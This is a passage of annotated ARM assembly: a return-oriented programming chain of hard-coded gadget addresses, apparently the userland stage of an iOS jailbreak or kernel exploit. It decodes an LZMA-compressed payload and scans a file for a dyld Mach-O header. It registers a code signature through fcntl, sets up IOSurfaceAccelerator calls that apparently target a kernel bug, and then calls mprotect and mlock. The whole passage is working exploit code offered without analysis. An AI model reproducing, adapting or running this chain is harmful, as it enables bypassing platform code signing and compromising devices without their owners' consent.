        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dd    4096                          ; -> R0
; R0=4096
        dg    0x20044CB3                    ; -> PC: POP {R4,PC}
        dg    0x33DA4E4D                    ; -> R4: valloc
; R0=4096 R4=valloc
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    src                           ; -> R4
        dd    0                             ; -> R7
; R4=&src R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_10                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_10 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    src                           ; -> R0
; R0=&src R4=&L_var_10 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_10 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33199949                    ; -> R4: lzma_stream_buffer_decode
        dd    0                             ; -> R7
; R4=lzma_stream_buffer_decode R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
memlimit du    L_vec_0                       ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R2
        du    payload                       ; -> R3
; R0=memlimit R1=0 R2=0 R3=&payload R4=lzma_stream_buffer_decode R7=0
        dg    0x2124412B                    ; -> PC: BLX R4 / ADD SP, #20 / POP {...PC}
        du    inPos                         ; -> A0
        dd    56                            ; -> A1
L_var_10 dd    0                             ; -> A2
        du    outPos                        ; -> A3
        dd    4096                          ; -> A4
        dg    0x33D78770                    ; -> R4: open
        dd    0                             ; -> R7
; R4=open R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        du    L_str_1                       ; -> R0
        dd    0x0000                        ; -> R1
; R0=&L_str_1 R1=0x0000 R4=open R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    fd                            ; -> R4
        dd    0                             ; -> R7
; R4=&fd R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    fd_                           ; -> R4
        dd    0                             ; -> R7
; R4=&fd_ R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    _fd                           ; -> R4
        dd    0                             ; -> R7
; R4=&_fd R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R4=0 R7=0
scan:
;
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
off     dd    -0x1000                       ; -> R0
        dd    0x1000                        ; -> R1
; R0=off R1=0x1000
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=0x1000 R7=0
        dg    0x20044CB3                    ; -> PC: POP {R4,PC}
        du    off                           ; -> R4
; R1=0x1000 R4=&off R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_12                      ; -> R4
        dd    0                             ; -> R7
; R1=0x1000 R4=&L_var_12 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    off                           ; -> R0
; R0=&off R1=0x1000 R4=&L_var_12 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=0x1000 R4=&L_var_12 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33D65F20                    ; -> R4: pread
        dd    0                             ; -> R7
; R1=0x1000 R4=pread R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
fd      dd    0                             ; -> R0
        du    dyld_header                   ; -> R1
        dd    0x4000                        ; -> R2
L_var_12 dd    0                             ; -> R3
; R0=fd R1=&dyld_header R2=0x4000 R3=L_var_12 R4=pread R7=0
        dg    0x2592ED47                    ; -> PC: ADD SP, #? / POP {R7,PC}
        times 0x27 dd 0
        dd    0                             ; -> R7
; R0=fd R1=&dyld_header R2=0x4000 R3=L_var_12 R4=pread
L_res_13:
        dg    0x214015FF                    ; -> PC: BLX R4 / ADD SP, #4 / POP {...PC}
        dd    0                             ; -> A0
        du    L_res_13                      ; -> R4
        dd    0                             ; -> R7
; R4=L_res_13 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x214015FF                    ; -> R0: L_gdg_14
; R0=L_gdg_14 R4=L_res_13 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    hdr                           ; -> R4
        dd    0                             ; -> R7
; R0=L_gdg_14 R4=&hdr R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    dyld_header                   ; -> R0
; R0=&dyld_header R4=&hdr R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R0=&dyld_header R4=0 R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
hdr     dd    0                             ; -> R0
        dd    -0xfeedface                   ; -> R1
; R0=hdr R1=-0xfeedface R4=0 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=-0xfeedface R4=0 R7=0
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=-0xfeedface R4=0 R7=0
        dg    0x200CDB93                    ; -> PC: POP {R4,R5,PC}
        du    L_stk_18                      ; -> R4
        du    L_stk_17                      ; -> R5
; R1=-0xfeedface R4=L_stk_18 R5=L_stk_17 R7=0
        dg    0x2EE58AE7                    ; -> PC: CMP R0, #0 / IT EQ / MOVEQ R4, R5 / MOV R0, R4 / POP {R4,R5,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R7
; R1=-0xfeedface R4=0 R5=0 R7=0
        dg    0x20113AEC                    ; -> PC: LDMIA R0, {...SP...PC}
L_stk_18:
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R3
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + scan                      ; -> SP
        dd    0                             ; -> R14
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
L_stk_17:
        du    off                           ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R3
        du    protmap                       ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + L_nxt_16                  ; -> SP
        dd    0                             ; -> R14
L_nxt_16:
; R0=&off R1=0 R3=0 R4=&protmap R5=0 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=0 R3=0 R4=&protmap R5=0 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R1=0 R3=0 R4=0 R5=0 R7=0
cmds:
;
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
lc      du    dyld_header + 28              ; -> R0
        dd    -0x1d                         ; -> R1
; R0=lc R1=-0x1d
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=-0x1d R7=0
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=-0x1d R7=0
        dg    0x200CDB93                    ; -> PC: POP {R4,R5,PC}
        du    L_stk_21                      ; -> R4
        du    L_stk_22                      ; -> R5
; R1=-0x1d R4=L_stk_21 R5=L_stk_22 R7=0
        dg    0x2EE58AE7                    ; -> PC: CMP R0, #0 / IT EQ / MOVEQ R4, R5 / MOV R0, R4 / POP {R4,R5,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R7
; R1=-0x1d R4=0 R5=0 R7=0
        dg    0x20113AEC                    ; -> PC: LDMIA R0, {...SP...PC}
L_stk_22:
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R3
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + done                      ; -> SP
        dd    0                             ; -> R14
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
L_stk_21:
        du    lc                            ; -> R0
        dd    4                             ; -> R1
        dd    0                             ; -> R3
        du    pcmdsize                      ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + L_nxt_20                  ; -> SP
        dd    0                             ; -> R14
L_nxt_20:
; R0=&lc R1=4 R3=0 R4=&pcmdsize R5=0 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4 R3=0 R4=&pcmdsize R5=0 R7=0
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4 R3=0 R4=&pcmdsize R5=0 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_25                      ; -> R4
        dd    0                             ; -> R7
; R1=4 R3=0 R4=&L_var_25 R5=0 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
pcmdsize dd    0                             ; -> R0
; R0=pcmdsize R1=4 R3=0 R4=&L_var_25 R5=0 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4 R3=0 R4=&L_var_25 R5=0 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    lc                            ; -> R4
        dd    0                             ; -> R7
; R1=4 R3=0 R4=&lc R5=0 R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        du    lc                            ; -> R0
L_var_25 dd    0                             ; -> R1
; R0=&lc R1=L_var_25 R3=0 R4=&lc R5=0 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_25 R3=0 R4=&lc R5=0 R7=0
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_25 R3=0 R4=&lc R5=0 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R1=L_var_25 R3=0 R4=0 R5=0 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    L_stk_26                      ; -> R0
; R0=L_stk_26 R1=L_var_25 R3=0 R4=0 R5=0 R7=0
        dg    0x20113AEC                    ; -> PC: LDMIA R0, {...SP...PC}
L_stk_26:
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R3
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + cmds                      ; -> SP
        dd    0                             ; -> R14
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
; R0=0 R1=0 R3=0 R4=0 R5=0 R7=0
done:
;
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    off                           ; -> R0
; R0=&off
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R7=0
        dg    0x20044CB3                    ; -> PC: POP {R4,PC}
siginfo du    L_vec_2                       ; -> R4
; R4=siginfo R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_27                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_27 R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        du    siginfo                       ; -> R0
        dd    8                             ; -> R1
; R0=&siginfo R1=8 R4=&L_var_27 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=8 R4=&L_var_27 R7=0
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=8 R4=&L_var_27 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_29                      ; -> R4
        dd    0                             ; -> R7
; R1=8 R4=&L_var_29 R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        du    lc                            ; -> R0
        dd    8                             ; -> R1
; R0=&lc R1=8 R4=&L_var_29 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=8 R4=&L_var_29 R7=0
        dg    0x204183F9                    ; -> PC: ADD R0, R1 / POP {R7,PC}
        dd    0                             ; -> R7
; R1=8 R4=&L_var_29 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33D20C65                    ; -> R4: __memcpy_chk
        dd    0                             ; -> R7
; R1=8 R4=__memcpy_chk R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
L_var_27 dd    0                             ; -> R0
L_var_29 dd    0                             ; -> R1
        dd    8                             ; -> R2
        dd    -1                            ; -> R3
; R0=L_var_27 R1=L_var_29 R2=8 R3=-1 R4=__memcpy_chk R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x33D66D6D                    ; -> R4: fcntl
        dd    0                             ; -> R7
; R4=fcntl R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
fd_     dd    0                             ; -> R0
        dd    97                            ; -> R1
psiginfo du    L_vec_2                       ; -> R2
        dd    0                             ; -> R3
; R0=fd_ R1=97 R2=psiginfo R3=0 R4=fcntl R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    result                        ; -> R4
        dd    0                             ; -> R7
; R4=&result R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33CB5E09                    ; -> R4: syslog
        dd    0                             ; -> R7
; R4=syslog R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dd    3                             ; -> R0
        du    L_str_3                       ; -> R1
result  dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=3 R1=&L_str_3 R2=result R3=0 R4=syslog R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x21D8DB11                    ; -> R4: CFDictionaryCreateMutable
        dd    0                             ; -> R7
; R4=CFDictionaryCreateMutable R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    0                             ; -> R1
        dg    0x3409976C                    ; -> R2: kCFTypeDictionaryKeyCallBacks
        dg    0x3409979C                    ; -> R3: kCFTypeDictionaryValueCallBacks
; R0=kCFAllocatorDefault R1=0 R2=kCFTypeDictionaryKeyCallBacks R3=kCFTypeDictionaryValueCallBacks R4=CFDictionaryCreateMutable R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=0 R2=kCFTypeDictionaryKeyCallBacks R3=kCFTypeDictionaryValueCallBacks R4=CFDictionaryCreateMutable R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    dict                          ; -> R4
        dd    0                             ; -> R7
; R4=&dict R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_31                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_31 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x35128188                    ; -> R0: kIOSurfaceBytesPerRow
; R0=kIOSurfaceBytesPerRow R4=&L_var_31 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_31 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    3                             ; -> R1
        du    pitch                         ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=3 R2=&pitch R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=3 R2=&pitch R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_32                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_32 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_31 dd    0                             ; -> R1
L_var_32 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_31 R2=L_var_32 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_31 R2=L_var_32 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_33                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_33 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x3512818C                    ; -> R0: kIOSurfaceBytesPerElement
; R0=kIOSurfaceBytesPerElement R4=&L_var_33 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_33 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    3                             ; -> R1
        du    bPE                           ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=3 R2=&bPE R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=3 R2=&bPE R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_34                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_34 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_33 dd    0                             ; -> R1
L_var_34 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_33 R2=L_var_34 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_33 R2=L_var_34 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_35                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_35 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x35128198                    ; -> R0: kIOSurfaceWidth
; R0=kIOSurfaceWidth R4=&L_var_35 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_35 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    3                             ; -> R1
        du    width                         ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=3 R2=&width R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=3 R2=&width R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_36                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_36 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_35 dd    0                             ; -> R1
L_var_36 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_35 R2=L_var_36 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_35 R2=L_var_36 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_37                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_37 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x3512819C                    ; -> R0: kIOSurfaceHeight
; R0=kIOSurfaceHeight R4=&L_var_37 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_37 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    3                             ; -> R1
        du    height                        ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=3 R2=&height R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=3 R2=&height R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_38                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_38 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_37 dd    0                             ; -> R1
L_var_38 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_37 R2=L_var_38 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_37 R2=L_var_38 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_39                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_39 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x351281A4                    ; -> R0: kIOSurfacePixelFormat
; R0=kIOSurfacePixelFormat R4=&L_var_39 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_39 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    3                             ; -> R1
pixelFormat du    L_str_4                       ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=3 R2=pixelFormat R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=3 R2=pixelFormat R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_40                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_40 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_39 dd    0                             ; -> R1
L_var_40 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_39 R2=L_var_40 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_39 R2=L_var_40 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_41                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_41 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dg    0x351281AC                    ; -> R0: kIOSurfaceAllocSize
; R0=kIOSurfaceAllocSize R4=&L_var_41 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_41 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    3                             ; -> R1
        du    size                          ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=3 R2=&size R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=3 R2=&size R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_42                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_42 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_41 dd    0                             ; -> R1
L_var_42 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_41 R2=L_var_42 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_41 R2=L_var_42 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x2B87F7FD                    ; -> R4: IOSurfaceAcceleratorCreate
        dd    0                             ; -> R7
; R4=IOSurfaceAcceleratorCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    0                             ; -> R1
        du    accel                         ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=0 R2=&accel R3=0 R4=IOSurfaceAcceleratorCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=0 R2=&accel R3=0 R4=IOSurfaceAcceleratorCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x2B87F98D                    ; -> R4: IOSurfaceAcceleratorTransferSurface
        dd    0                             ; -> R7
; R4=IOSurfaceAcceleratorTransferSurface R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=0 R1=0 R2=0 R3=0 R4=IOSurfaceAcceleratorTransferSurface R7=0
        dg    0x205F6FDF                    ; -> PC: BLX R4 / ADD SP, #12 / POP {...PC}
        dd    0                             ; -> A0
        dd    0                             ; -> A1
        dd    0                             ; -> A2
        dg    0x33D785E8                    ; -> R4: mprotect
        dd    0                             ; -> R7
; R4=mprotect R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=0 R1=0 R2=0 R3=0 R4=mprotect R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x33D7A5C4                    ; -> R4: mlock
